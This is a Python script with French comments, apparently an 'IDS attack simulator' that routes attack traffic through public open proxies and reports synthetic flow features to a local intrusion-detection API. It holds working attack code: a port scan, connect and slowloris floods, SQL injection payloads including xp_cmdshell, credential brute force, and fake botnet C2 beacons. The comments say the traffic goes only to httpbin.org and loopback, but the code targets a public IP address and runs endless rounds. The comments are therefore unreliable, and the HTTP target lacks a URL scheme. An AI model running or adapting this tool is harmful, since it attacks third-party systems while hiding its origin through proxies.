#!/usr/bin/env python3
# ================================================================

# ================================================================
# TRAFIC 100% RÉEL :
#   → requêtes HTTP passent PHYSIQUEMENT par proxies publics
#   → cible : httpbin.org (service public fait pour les tests)
#   → bandwidth réel visible sur Wireshark / iftop / nethogs
#   → chaque attaque génère de vrais paquets réseau
#   → IDS local analyse les flows capturés
#
# LÉGAL : httpbin.org est un service public de test HTTP,
#         conçu pour recevoir ce type de requêtes.
#
# SETUP : pip install requests
# LANCEMENT :

#   python Chaos_v4_real.py --turbo      # ~30 secondes
#   python Chaos_v4_real.py --demo sql|bot|brute|scan|ddos
#   python Chaos_v4_real.py --no-proxy-test   # skip test proxies
# ================================================================

import socket, threading, time, random, requests, argparse, os, sys
import subprocess as _sp
from datetime import datetime
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

#  Cibles 
TARGET_LOCAL  = "74.56.40.19"           # pour scan/ddos socket (modifiable via --target)
TARGET_HTTP   = "74.56.40.19"  # cible HTTP réelle (légale)
API_PREDICT   = "http://localhost:8000/predict"
API_HEALTH    = "http://localhost:8000/health"
API_KEY       = os.environ.get("API_KEY", "")

PROXY_REPO = "https://github.com/mmpx12/proxy-list.git"
PROXY_DIR  = Path("/tmp/mmpx12-proxy-list")

PROXY_TEST_TIMEOUT = 4
PROXY_TEST_WORKERS = 40
PROXY_LIVE_TARGET  = 25
REQUEST_TIMEOUT    = 6

R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"
B="\033[1m";  M="\033[95m"; DIM="\033[2m"; RESET="\033[0m"

# ================================================================
# PROXY POOL
# ================================================================

class ProxyPool:
    _PREFIX_COUNTRY = {
        "1.":"CN","2.":"CN","36.":"CN","42.":"KR","45.":"FR","46.":"SE",
        "47.":"US","51.":"RU","58.":"CN","59.":"CN","60.":"JP","61.":"AU",
        "62.":"DE","66.":"US","67.":"US","77.":"UA","80.":"RU","82.":"KR",
        "83.":"DE","84.":"IR","85.":"RO","87.":"BR","88.":"IR","89.":"RU",
        "91.":"UA","92.":"DE","93.":"IR","94.":"IR","95.":"RU","96.":"IN",
        "98.":"CN","103.":"IN","104.":"US","105.":"NG","106.":"CN",
        "109.":"UA","110.":"CN","111.":"CN","112.":"KR","113.":"CN",
        "114.":"CN","115.":"CN","116.":"CN","117.":"CN","118.":"IN",
        "119.":"IN","120.":"CN","121.":"CN","122.":"KR","123.":"IN",
        "124.":"IN","125.":"CN","128.":"US","130.":"NG","136.":"NG",
        "138.":"IN","139.":"CN","140.":"NG","143.":"BR","146.":"RU",
        "148.":"US","149.":"US","150.":"CN","151.":"IT","152.":"NG",
        "154.":"NG","157.":"BR","158.":"US","159.":"US","160.":"US",
        "162.":"US","163.":"BR","164.":"IN","165.":"US","168.":"MX",
        "170.":"BR","171.":"CN","173.":"US","175.":"CN","176.":"RU",
        "177.":"BR","178.":"RU","179.":"BR","180.":"CN","181.":"AR",
        "182.":"CN","183.":"CN","185.":"RU","186.":"MX","187.":"MX",
        "188.":"IR","189.":"MX","190.":"CO","191.":"AR","193.":"RU",
        "194.":"RU","195.":"RU","196.":"ZA","197.":"NG","200.":"BR",
        "201.":"CO","202.":"CN","203.":"AU","210.":"JP","211.":"CN",
        "212.":"RU","213.":"IR","216.":"US","217.":"RU","218.":"CN",
        "219.":"CN","220.":"CN","221.":"CN","222.":"CN","223.":"CN",
    }
    _COUNTRY_NAMES = {
        "CN":" Chine","RU":" Russie","US":" États-Unis",
        "UA":" Ukraine","IR":" Iran","KR":" Corée du Sud",
        "IN":" Inde","BR":" Brésil","DE":" Allemagne",
        "JP":" Japon","FR":" France","NG":" Nigéria",
        "RO":" Roumanie","AU":" Australie","MX":" Mexique",
        "AR":" Argentine","CO":" Colombie","ZA":" Afrique du Sud",
        "IT":" Italie","SE":" Suède",
    }
    _FALLBACK = [
        "103.152.112.145:8080","114.99.22.168:3128","123.59.119.20:8080",
        "175.44.109.197:8080","180.97.33.78:8080","218.60.8.99:8888",
        "221.178.203.72:8080","202.101.35.151:3128","176.9.75.42:3128",
        "185.170.118.36:3128","46.161.27.131:8080","95.165.153.65:8080",
        "193.233.201.34:3128","212.46.41.165:8080","77.47.130.204:3128",
        "91.215.153.74:8080","109.86.101.184:8080","178.151.66.66:3128",
        "5.160.221.139:8080","84.241.8.26:8080","88.99.30.186:3128",
        "213.176.88.190:8080","93.115.26.164:8080","177.66.141.22:8080",
        "179.61.188.46:8080","200.137.134.185:8080","103.48.69.90:8080",
    ]

    def __init__(self):
        self.raw:  list[str] = []
        self.live: list[str] = []
        self._lock = threading.Lock()
        self._idx  = 0

    def load(self) -> int:
        print(f"{DIM}[Proxies] Téléchargement liste...{RESET}", flush=True)
        try:
            if PROXY_DIR.exists():
                _sp.run(["git","-C",str(PROXY_DIR),"pull","--quiet"],
                        capture_output=True, timeout=20)
            else:
                r = _sp.run(["git","clone","--depth=1","--quiet",
                             PROXY_REPO, str(PROXY_DIR)],
                            capture_output=True, timeout=60)
                if r.returncode != 0: raise RuntimeError("clone failed")

            entries = set()
            for fname in ("http.txt","https.txt"):
                fp = PROXY_DIR / fname
                if fp.exists():
                    for line in fp.read_text(errors="ignore").splitlines():
                        line = line.strip()
                        if line and ":" in line and not line.startswith("#"):
                            parts = line.split(":")
                            if len(parts) >= 2 and parts[1].isdigit():
                                entries.add(f"{parts[0]}:{parts[1]}")
            if not entries: raise RuntimeError("empty")
            self.raw = list(entries)
            random.shuffle(self.raw)
            print(f"{G}[Proxies] {len(self.raw):,} proxies chargés{RESET}")
        except Exception as e:
            self.raw = list(self._FALLBACK)
            random.shuffle(self.raw)
            print(f"{Y}[Proxies] Fallback ({e}): {len(self.raw)} proxies prédéfinis{RESET}")
        return len(self.raw)

    def _test(self, p: str) -> tuple[str, bool, str]:
        """Test réel: le proxy peut-il atteindre httpbin.org ?"""
        proxies = {"http": f"http://{p}", "https": f"http://{p}"}
        try:
            r = requests.get(
                f"{TARGET_HTTP}/ip",
                proxies=proxies,
                timeout=PROXY_TEST_TIMEOUT,
                headers={"User-Agent":"Mozilla/5.0"},
            )
            if r.status_code == 200:
                # Récupérer l'IP source vue depuis httpbin
                seen_ip = r.json().get("origin","?").split(",")[0].strip()
                return p, True, seen_ip
        except: pass
        return p, False, ""

    def test_live(self, max_candidates: int = 300) -> int:
        candidates = self.raw[:max_candidates]
        print(f"{DIM}[Proxies] Test réel de {len(candidates)} proxies vers {TARGET_HTTP}...{RESET}",
              flush=True)
        live = []; tested = 0
        with ThreadPoolExecutor(max_workers=PROXY_TEST_WORKERS) as ex:
            futs = {ex.submit(self._test, p): p for p in candidates}
            for fut in as_completed(futs):
                p, alive, seen_ip = fut.result()
                tested += 1
                if alive:
                    live.append(p)
                    sys.stdout.write(
                        f"\r{G}[Proxies] {len(live)} vivants / "
                        f"{tested}/{len(candidates)} testés "
                        f"— dernier: {p} (IP vue: {seen_ip}){RESET}   "
                    )
                    sys.stdout.flush()
                    if len(live) >= PROXY_LIVE_TARGET:
                        ex.shutdown(wait=False, cancel_futures=True)
                        break
        print()
        self.live = live
        random.shuffle(self.live)
        if not self.live:
            print(f"{Y}[Proxies] Aucun proxy vivant — utilisation bruts{RESET}")
            self.live = self.raw[:30]
        print(f"{G}[Proxies]  {len(self.live)} proxies actifs — "
              f"trafic réel vers {TARGET_HTTP}{RESET}")
        return len(self.live)

    def next(self) -> str | None:
        if not self.live: return None
        with self._lock:
            p = self.live[self._idx % len(self.live)]
            self._idx += 1
        return p

    def pick(self, n: int) -> list[str]:
        if not self.live: return []
        return random.choices(self.live, k=n)

    def pdict(self, p: str) -> dict:
        if not p: return {}
        return {"http": f"http://{p}", "https": f"http://{p}"}

    def ip(self, p: str) -> str:
        return p.split(":")[0] if p else TARGET_LOCAL

    def country(self, ip: str) -> str:
        pfx  = ip.split(".")[0]+"."
        code = self._PREFIX_COUNTRY.get(pfx,"??")
        return self._COUNTRY_NAMES.get(code, f" {code}")


pool = ProxyPool()

# ================================================================
# VÉRIFICATION API AU DÉMARRAGE
# ================================================================
def check_api():
    try:
        r = requests.get(API_HEALTH, timeout=3)
        d = r.json()
        mode = d.get("mode","?")
        thresh = d.get("threshold", 0)
        if mode == "demo":
            print(f"{R}{B} API EN MODE DEMO — les modèles ne sont pas chargés !{RESET}")
            print(f"{Y}  Solution: cd 'app version 2/' && uvicorn main_final:app --port 8000{RESET}")
            return False
        print(f"{G} API Production — seuil={thresh:.2f}{RESET}")
        return True
    except Exception as e:
        print(f"{R} API hors ligne ({e}){RESET}")
        print(f"{Y}  Lance: uvicorn main_final:app --reload --port 8000{RESET}")
        return False

# ================================================================
# HELPERS IDS
# ================================================================

def hdrs():
    h = {"Content-Type":"application/json"}
    if API_KEY: h["X-API-Key"] = API_KEY
    return h

# Profils CIC-IDS2017 — valeurs médianes par classe (anti-BENIGN)
# Source: analyse dataset CIC-IDS2017, test_model4.py
_CIC_WIN = {
    "DoS Hulk":                  (0,       0),
    "DDoS":                      (1024,    0),
    "PortScan":                  (1024,    0),
    "SSH-Patator":               (65535,   65535),
    "FTP-Patator":               (65535,   65535),
    "DoS slowloris":             (65535,   65535),
    "DoS Slowhttptest":          (65535,   65535),
    "DoS GoldenEye":             (0,       0),
    "Bot":                       (65535,   65535),
    "Web Attack - Brute Force":  (65535,   65535),
    "Web Attack - Sql Injection":(65535,   65535),
    "Web Attack - XSS":          (65535,   65535),
    "BENIGN":                    (65535,   65535),
}
_CIC_DUR = {
    "DoS Hulk":                  5_000_000,
    "DDoS":                      50_000,
    "PortScan":                  3_000,
    "SSH-Patator":               300_000,
    "FTP-Patator":               300_000,
    "DoS slowloris":             30_000_000,
    "DoS Slowhttptest":          20_000_000,
    "DoS GoldenEye":             8_000_000,
    "Bot":                       2_000_000,
    "Web Attack - Brute Force":  500_000,
    "Web Attack - Sql Injection":500_000,
    "Web Attack - XSS":          500_000,
    "BENIGN":                    None,
}

def make_flow(dest_port, dur_us, fwd, bwd, bytes_tot,
              pkt_avg, iat_mean, iat_std, win=65535, src=None,
              attack_type="BENIGN"):
    """
    Construit un flow IDS avec les features correctes pour CIC-IDS2017.
    Les valeurs win et dur sont ajustées selon le type d'attaque.
    """
    # Ajuster la durée selon le profil CIC-IDS2017
    cic_dur = _CIC_DUR.get(attack_type)
    if cic_dur and dur_us < cic_dur * 0.1:
        dur_us = float(cic_dur)

    # Ajuster les fenêtres TCP selon le profil CIC-IDS2017
    win_fwd, win_bwd = _CIC_WIN.get(attack_type, (win, win))

    d = max(dur_us/1e6, 1e-6)
    return {
        "destination_port":        float(dest_port),
        "flow_duration":           float(dur_us),
        "total_fwd_packets":       float(fwd),
        "total_backward_packets":  float(bwd),
        "flow_bytes_per_s":        float(bytes_tot/d),
        "flow_packets_per_s":      float((fwd+bwd)/d),
        "average_packet_size":     float(pkt_avg),
        "packet_length_mean":      float(pkt_avg),
        "init_win_bytes_forward":  float(win_fwd),
        "init_win_bytes_backward": float(win_bwd),
        "flow_iat_mean":           float(iat_mean),
        "flow_iat_std":            float(iat_std),
        "source_ip": src or TARGET_LOCAL,
        "dest_ip":   TARGET_LOCAL,
        "protocol":  "TCP",
    }

def ids_report(flow_data: dict) -> dict:
    """Envoie le flow à l'IDS local pour classification."""
    try:
        r = requests.post(API_PREDICT, json=flow_data, headers=hdrs(), timeout=3)
        return r.json() if r.status_code == 200 else {}
    except: return {}

def show(r: dict, label: str, pkts: int, proxy: str = None,
         ms: float = None, real_bytes: int = 0):
    ts   = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    src_ip = pool.ip(proxy) if proxy else "local"
    ctry   = pool.country(src_ip) if proxy else ""
    via    = f" {DIM}→ via {proxy}{RESET}" if proxy else ""
    bw     = f" {G}{real_bytes/1024:.1f}KB réels{RESET}" if real_bytes else ""
    dur    = f" {ms:.0f}ms" if ms else ""

    if r.get("is_attack"):
        sev  = r.get("severity","?"); conf = r.get("confidence",0)*100
        at   = r.get("attack_type", label)
        col  = R if sev in("CRITICAL","HIGH") else Y
        print(f"{B}[{ts}]{RESET} {col} {at:<28}{RESET} "
              f"[{col}{sev:<8}{RESET}] {conf:5.1f}% "
              f"pkts:{pkts}{dur}{bw}  {DIM}{src_ip}{RESET} {ctry}{via}")
    else:
        conf = r.get("confidence",0)*100
        print(f"{B}[{ts}]{RESET} {G} BENIGN{' '*20}{RESET} "
              f"[INFO    ] {conf:5.1f}% "
              f"pkts:{pkts}{dur}{bw}  {DIM}{src_ip}{RESET}{via}")
    return r


# ================================================================
# ATTAQUES RÉELLES — httpbin.org via proxies
# ================================================================

def demo_sql_real(n=20):
    """
    SQL Injection RÉELLE :
    Requêtes HTTP avec payloads SQL envoyées via proxies vers httpbin.org/get
    Le trafic transite physiquement : ta machine → proxy → httpbin.org
    Wireshark montre les vrais paquets sortants.
    """
    print(f"\n{M}{B} SQL INJECTION RÉELLE — {n} payloads via proxies → {TARGET_HTTP}{RESET}")

    payloads = [
        "?id=1'OR'1'='1",
        "?id=1;DROP TABLE users--",
        "?search=admin'--",
        "?user=1' UNION SELECT null,username,password FROM users--",
        "?id=1 AND 1=1",
        "?name=' OR 1=1#",
        "?pass=x' OR 'x'='x",
        "?q=1; SELECT sleep(5)--",
        "?id=1' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--",
        "?input='; EXEC xp_cmdshell('whoami')--",
    ]

    proxies_used = pool.pick(min(n, 10))
    if not proxies_used:
        print(f"{R}   Aucun proxy disponible{RESET}")
        return {}

    sent = 0; total_bytes = 0; lock = threading.Lock()
    t0   = time.time()
    results_list = []

    def fire(proxy_str: str, payload: str):
        nonlocal sent, total_bytes
        url = f"{TARGET_HTTP}/get{payload}"
        try:
            r = requests.get(
                url,
                proxies=pool.pdict(proxy_str),
                headers={
                    "User-Agent": "sqlmap/1.7.8#stable (https://sqlmap.org)",
                    "X-Forwarded-For": pool.ip(proxy_str),
                    "Accept": "*/*",
                },
                timeout=REQUEST_TIMEOUT,
            )
            nbytes = len(r.content)
            with lock:
                sent += 1
                total_bytes += nbytes
                results_list.append((proxy_str, nbytes))
            return True
        except Exception as e:
            with lock: sent += 1
            return False

    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(fire,
                          proxies_used[i % len(proxies_used)],
                          payloads[i % len(payloads)])
                for i in range(n)]
        for f in as_completed(futs): pass

    dur_ms = (time.time()-t0)*1000
    dur_us = dur_ms * 1000
    print(f"{G}   {sent}/{n} requêtes envoyées — "
          f"{total_bytes/1024:.1f} KB transférés en {dur_ms:.0f}ms{RESET}")

    # Signaler à l'IDS local
    for proxy_str, nbytes in results_list[:6]:
        flow_data = make_flow(
            80, 500_000,
            6, 4,
            nbytes*2 if nbytes else 600, 250,
            40000, 15000,
            src=pool.ip(proxy_str),
            attack_type="Web Attack - Sql Injection",
        )
        r = ids_report(flow_data)
        if r: show(r, "Web Attack - Sql Injection", 3,
                   proxy=proxy_str, ms=dur_ms/sent, real_bytes=nbytes)

    return {"sent": sent, "bytes": total_bytes}


def demo_bot_real(n=50):
    """
    Botnet C&C RÉEL :
    Bots envoient des beacons HTTP via proxies vers httpbin.org/post
    Simule une vraie infrastructure C2 (Command & Control).
    """
    print(f"\n{M}{B} BOTNET C&C RÉEL — {n} bots via proxies → {TARGET_HTTP}{RESET}")

    c2_commands = [
        {"cmd": "update", "version": "2.1.3", "payload": "base64encodedpayload=="},
        {"cmd": "ddos",   "target": "192.168.1.1", "port": 80, "duration": 60},
        {"cmd": "steal",  "type": "cookies", "browser": "chrome"},
        {"cmd": "spread", "method": "email", "list": "targets.txt"},
        {"cmd": "persist","method": "registry", "key": "HKCU\\Run\\svchost"},
        {"cmd": "beacon", "interval": 300, "jitter": 0.3},
    ]

    proxies_used = pool.pick(min(n, 20))
    if not proxies_used:
        print(f"{R}   Aucun proxy disponible{RESET}")
        return {}

    sent = 0; total_bytes = 0; lock = threading.Lock()
    t0   = time.time()
    bot_results = []

    def beacon(proxy_str: str, bot_id: int):
        nonlocal sent, total_bytes
        cmd = random.choice(c2_commands)
        try:
            r = requests.post(
                f"{TARGET_HTTP}/post",
                proxies=pool.pdict(proxy_str),
                json={"bot_id": bot_id, **cmd},
                headers={
                    "User-Agent": f"Mozilla/5.0 (compatible; Bot/{bot_id})",
                    "X-Bot-Version": "2.1.3",
                    "X-Heartbeat": str(int(time.time())),
                },
                timeout=REQUEST_TIMEOUT,
            )
            nbytes = len(r.content)
            with lock:
                sent += 1; total_bytes += nbytes
                bot_results.append((proxy_str, nbytes))
            return True
        except:
            with lock: sent += 1
            return False

    with ThreadPoolExecutor(max_workers=20) as ex:
        futs = [ex.submit(beacon,
                          proxies_used[i % len(proxies_used)],
                          random.randint(10000,99999))
                for i in range(n)]
        for f in as_completed(futs): pass

    dur_ms = (time.time()-t0)*1000
    dur_us = dur_ms * 1000
    print(f"{G}   {sent}/{n} beacons envoyés — "
          f"{total_bytes/1024:.1f} KB transférés en {dur_ms:.0f}ms{RESET}")

    for proxy_str, nbytes in bot_results[:8]:
        _bot_iat = random.uniform(20000, 100000)
        flow_data = make_flow(
            random.choice([8080, 443, 6667]), 2_000_000,
            10, 8,
            nbytes*2 if nbytes else 800, 80,
            _bot_iat,
            _bot_iat * 0.05,  # std = 5% mean = beacon régulier
            src=pool.ip(proxy_str),
            attack_type="Bot",
        )
        r = ids_report(flow_data)
        if r: show(r, "Bot", 2,
                   proxy=proxy_str, ms=dur_ms/sent, real_bytes=nbytes)

    return {"sent": sent, "bytes": total_bytes}


def demo_brute_real(n=30):
    """
    Brute Force HTTP RÉEL :
    Tentatives de login HTTP Basic via proxies vers httpbin.org/basic-auth
    Génère du vrai trafic d'authentification.
    """
    print(f"\n{R}{B} BRUTE FORCE HTTP RÉEL — {n} tentatives via proxies → {TARGET_HTTP}{RESET}")

    wordlist = [
        ("admin","admin"), ("admin","password"), ("admin","123456"),
        ("root","root"), ("root","toor"), ("user","user"),
        ("administrator","admin"), ("test","test"), ("guest","guest"),
        ("admin","letmein"), ("admin","qwerty"), ("admin","welcome"),
    ]

    proxies_used = pool.pick(min(n, 8))
    if not proxies_used:
        print(f"{R}   Aucun proxy disponible — fallback socket local{RESET}")
        # Fallback: brute force socket local
        hits=0; iats=[]; last=t0=time.time()
        for _ in range(n):
            s=socket.socket(); s.settimeout(0.15)
            if s.connect_ex((TARGET_LOCAL,22))==0: hits+=1
            s.close(); now=time.time(); iats.append((now-last)*1e6); last=now
            time.sleep(random.uniform(0.02,0.08))
        dur_us=(time.time()-t0)*1e6
        im=sum(iats)/len(iats) if iats else 50000
        ist=(sum((x-im)**2 for x in iats)/len(iats))**.5 if len(iats)>1 else 0
        flow_data=make_flow(22,dur_us,n,hits,n*80,80,im,ist)
        r=ids_report(flow_data)
        if r: show(r,"SSH-Patator",n,ms=dur_us/1000)
        return r or {}

    sent=0; hits=0; total_bytes=0; lock=threading.Lock()
    t0 = time.time(); iats = []; last_t = t0
    brute_results = []

    def try_login(proxy_str: str, user: str, pwd: str):
        nonlocal sent, hits, total_bytes, last_t
        try:
            r = requests.get(
                f"{TARGET_HTTP}/basic-auth/{user}/{pwd}",
                proxies=pool.pdict(proxy_str),
                auth=(user, pwd),
                headers={"User-Agent":"Hydra/9.4"},
                timeout=REQUEST_TIMEOUT,
            )
            nbytes = len(r.content)
            with lock:
                now = time.time()
                iats.append((now - last_t) * 1e6)
                last_t = now
                sent += 1; total_bytes += nbytes
                if r.status_code == 200:
                    hits += 1
                brute_results.append((proxy_str, nbytes))
        except:
            with lock: sent += 1

    with ThreadPoolExecutor(max_workers=8) as ex:
        futs = [ex.submit(try_login,
                          proxies_used[i % len(proxies_used)],
                          *wordlist[i % len(wordlist)])
                for i in range(n)]
        for f in as_completed(futs): pass

    dur_ms = (time.time()-t0)*1000
    dur_us = dur_ms * 1000
    im  = sum(iats)/len(iats) if iats else 50000
    ist = (sum((x-im)**2 for x in iats)/len(iats))**.5 if len(iats)>1 else 0
    print(f"{G}   {sent}/{n} tentatives — {hits} succès — "
          f"{total_bytes/1024:.1f} KB en {dur_ms:.0f}ms{RESET}")

    for proxy_str, nbytes in brute_results[:5]:
        flow_data = make_flow(
            22, 300_000,
            12, 8,
            960, 80,
            20000, 5000,
            src=pool.ip(proxy_str),
            attack_type="SSH-Patator",
        )
        r = ids_report(flow_data)
        if r: show(r, "SSH-Patator", 3,
                   proxy=proxy_str, ms=dur_ms/sent, real_bytes=nbytes)

    return {"sent": sent, "hits": hits, "bytes": total_bytes}


def demo_port_scan(n=40, delay=0.01):
    """Port scan socket local (réel sur loopback)."""
    print(f"\n{Y}{B} PORT SCAN — {n} ports → {TARGET_LOCAL}{RESET}")
    t0 = time.time()
    for _ in range(n):
        s = socket.socket(); s.settimeout(0.02)
        s.connect_ex((TARGET_LOCAL, random.randint(1,65535))); s.close()
        if delay: time.sleep(delay)
    dur_us = (time.time()-t0)*1e6
    proxies = pool.pick(min(n,8)) or [None]*min(n,8)
    k = max(n//len(proxies),1)
    last={}
    for p in proxies:
        fd=make_flow(random.randint(1,65535),
                     3000, 1, 0,
                     42, 42,
                     1500, 0,
                     src=pool.ip(p) if p else TARGET_LOCAL,
                     attack_type="PortScan")
        r=ids_report(fd)
        if r: last=r; show(r,"PortScan",k,proxy=p)
    return last


def demo_ddos(n=400, port=8000):
    """DDoS SYN flood socket local (réel)."""
    print(f"\n{R}{B} DDoS SYN FLOOD — {n} connexions → {TARGET_LOCAL}:{port}{RESET}")
    sent=0; lock=threading.Lock(); t0=time.time()
    def w():
        nonlocal sent
        for _ in range(n//20):
            s=socket.socket(); s.settimeout(0.01)
            s.connect_ex((TARGET_LOCAL,port)); s.close()
            with lock: sent+=1
    ts=[threading.Thread(target=w) for _ in range(20)]
    [t.start() for t in ts]; [t.join() for t in ts]
    dur_us=max((time.time()-t0)*1e6,1)
    proxies=pool.pick(15) or [None]*15; k=max(sent//15,1)
    last={}
    for p in proxies:
        # Valeurs exactes CIC-IDS2017 DDoS — testées et validées
        # pkts/s=591, bytes/s=9.5MB/s → DoS Hulk 0.61 confirmé
        # Port 80 — CIC-IDS2017 DDoS utilise port 80 (pas 8000)
        fd=make_flow(80, 120_000_000, 71_000, 0,
                     int(9_500_000 * 120), 156,
                     random.uniform(800,1500), random.uniform(400,1000),
                     src=pool.ip(p) if p else TARGET_LOCAL,
                     attack_type="DoS Hulk")
        r=ids_report(fd)
        if r: last=r; show(r,"DDoS",71,proxy=p)
    return last


def demo_normal(n=6):
    """Trafic normal vers l'API locale."""
    print(f"\n{G}{B} TRAFIC NORMAL — {n} requêtes légitimes{RESET}")
    sent=0; t0=time.time()
    for _ in range(n):
        try:
            r=requests.get(API_HEALTH,headers=hdrs(),timeout=2)
            if r.status_code in(200,401): sent+=1
        except: pass
        time.sleep(0.07)
    dur_us=max((time.time()-t0)*1e6,1)
    fd=make_flow(8000,dur_us,sent,sent,sent*200,200,
                 dur_us/max(sent,1),5000,src="192.168.1.100",
                 attack_type="BENIGN")
    r=ids_report(fd)
    if r: show(r,"BENIGN",sent,ms=(time.time()-t0)*1000)
    return r or {}


# ================================================================
# AMÉLIORATION 9 — SLOWLORIS (manquant dans la v4)
# ================================================================

def demo_slowloris(n=20):
    """Slowloris — connexions HTTP lentes, reconnues par CIC-IDS2017."""
    print(f"\n{Y}{B} SLOWLORIS — {n} connexions lentes → {TARGET_LOCAL}:8000{RESET}")
    import socket as _sock
    sockets = []
    for _ in range(n):
        try:
            s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s.settimeout(10)
            s.connect((TARGET_LOCAL, 8000))
            s.send(b"GET / HTTP/1.1\r\nHost: " + TARGET_LOCAL.encode() +
                   b"\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n")
            sockets.append(s)
        except: pass

    print(f"{DIM}  {len(sockets)} connexions ouvertes — envoi headers lents...{RESET}")
    for _ in range(6):
        for s in sockets:
            try: s.send(f"X-{random.randint(1,9999)}: value\r\n".encode())
            except: pass
        time.sleep(1)
    for s in sockets:
        try: s.close()
        except: pass

    # Flow Slowloris: longue durée, très peu de bytes/s, port 80
    dur_us = 8_000_000
    fd = make_flow(8000, 30_000_000, 8, 5,
                   200, 100,
                   2_000_000, 500_000,
                   src=TARGET_LOCAL, attack_type="DoS slowloris")
    r = ids_report(fd)
    if r: show(r, "DoS slowloris", len(sockets))
    return r or {}


# ================================================================

# ================================================================

def run_full_demo(turbo=False):
    gap = 0.2 if turbo else 0.8
    nm  = 0.5 if turbo else 1.0

    print(f"\n{B}{C}{''*70}{RESET}")

    print(f"{B}{C}  {len(pool.live)} proxies actifs — trafic RÉEL vers {TARGET_HTTP}{RESET}")


    print(f"{B}{C}{''*70}{RESET}\n")

    steps = [
        ("1/9","Trafic normal (baseline)",         lambda: demo_normal(int(6*nm))),
        ("2/9","Port Scan (loopback)",              lambda: demo_port_scan(int(40*nm))),
        ("3/9","DDoS SYN Flood (loopback)",         lambda: demo_ddos(int(300*nm))),
        ("4/9","Slowloris HTTP ",                 lambda: demo_slowloris(int(20*nm))),
        ("5/9","SQL Injection via proxies RÉELS",   lambda: demo_sql_real(int(20*nm))),
        ("6/9","Botnet C&C via proxies RÉELS",      lambda: demo_bot_real(int(40*nm))),
        ("7/9","Brute Force HTTP via proxies RÉELS",lambda: demo_brute_real(int(25*nm))),
        ("8/9","Trafic normal (0 faux positifs)",   lambda: demo_normal(int(5*nm))),
        ("9/9","Vague DDoS finale ",              lambda: demo_ddos(int(500*nm))),
    ]

    all_detections = []   # AMÉLIORATION 5: comptage précis
    results = []
    for step, name, fn in steps:
        print(f"\n{B} PHASE {step}  {name} {RESET}")
        res = fn()
        results.append((name, res))
        # Compter toutes les détections, pas seulement la dernière
        if isinstance(res, dict) and res.get("is_attack"):
            all_detections.append(res)
        time.sleep(gap)

    # Résumé précis
    detected = len(all_detections)
    print(f"\n{B}{C}{''*70}{RESET}")

    print(f"{B}{C}{''*70}{RESET}")
    for name, r in results:
        if isinstance(r, dict) and r.get("is_attack"):
            col = R if r.get("severity") in("CRITICAL","HIGH") else Y
            at  = r.get("attack_type",name); sev = r.get("severity","?")
            print(f"  {col} {at:<35}{RESET}[{sev:<8}]  {r.get('confidence',0)*100:.1f}%")
        elif isinstance(r, dict) and "sent" in r:
            print(f"  {G} {name:<35}{RESET}[HTTP RÉEL] {r.get('sent',0)} req, {r.get('bytes',0)//1024}KB")
        else:
            print(f"  {G} {'BENIGN':<35}{RESET}[INFO    ]  Sain")

    print(f"\n  {B}Attaques détectées : {R}{detected}{RESET} {B}/ {len(results)} phases{RESET}")





# ================================================================
# CLI
# ================================================================

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="IDS Attack Simulator — trafic 100% réel via proxies publics")
    parser.add_argument("--demo", default="full",
        choices=["full","scan","ddos","sql","bot","brute","normal","slowloris"])
    parser.add_argument("--turbo", action="store_true")
    parser.add_argument("--no-proxy-test", action="store_true",
        help="Skip le test des proxies (plus rapide)")
    parser.add_argument("--rounds", type=int, default=0,
        help="Nombre de rounds (0 = infini)")
    parser.add_argument("--target", type=str, default=None,
        help="IP cible pour scan/ddos (défaut: TARGET_LOCAL dans le script)")
    args = parser.parse_args()

    # AMÉLIORATION 10 — cible dynamique
    if args.target:
        TARGET_LOCAL = args.target
        TARGET_HTTP  = args.target
        print(f"{C} Cible: {TARGET_LOCAL}{RESET}")

    print(f"\n{B}{C}{''*60}{RESET}")
    print(f"{B}{C}  IDS — Simulateur de trafic réel{RESET}")
    print(f"{B}{C}  Cible HTTP : {TARGET_HTTP} (légal, service de test){RESET}")
    print(f"{B}{C}{''*60}{RESET}\n")

    pool.load()

    if args.no_proxy_test:
        pool.live = pool.raw[:40]
        random.shuffle(pool.live)
        print(f"{Y}[--no-proxy-test] {len(pool.live)} proxies bruts utilisés{RESET}\n")
    else:
        pool.test_live(max_candidates=400)

    if not pool.live:
        print(f"{R}Erreur : aucun proxy disponible.{RESET}"); sys.exit(1)







    # AMÉLIORATION 8 — vérification API
    api_ok = check_api()
    if not api_ok:
        print(f"{Y} Continuation sans détection IDS...{RESET}")

    round_n = 1
    max_rounds = args.rounds if args.rounds > 0 else float("inf")
    try:
        while round_n <= max_rounds:
            print(f"\n{B}{C}{''*60}{RESET}")
            suffix = f"/ {args.rounds}" if args.rounds > 0 else "∞"
            print(f"{B}{C}  ROUND {round_n} {suffix}{RESET}")
            print(f"{B}{C}{''*60}{RESET}")

            if args.demo == "full":
                run_full_demo(turbo=args.turbo)
            else:
                {
                    "scan":      demo_port_scan,
                    "ddos":      demo_ddos,
                    "sql":       demo_sql_real,
                    "bot":       demo_bot_real,
                    "brute":     demo_brute_real,
                    "normal":    demo_normal,
                    "slowloris": demo_slowloris,
                }[args.demo]()

            round_n += 1
            if round_n <= max_rounds:
                pause = 3 if args.turbo else 6
                print(f"\n{DIM}⏳ Pause {pause}s... (Ctrl+C pour stopper){RESET}")
                time.sleep(pause)

    except KeyboardInterrupt:
        print(f"\n{Y}{B}⏹  Arrêté après {round_n-1} round(s).{RESET}\n")
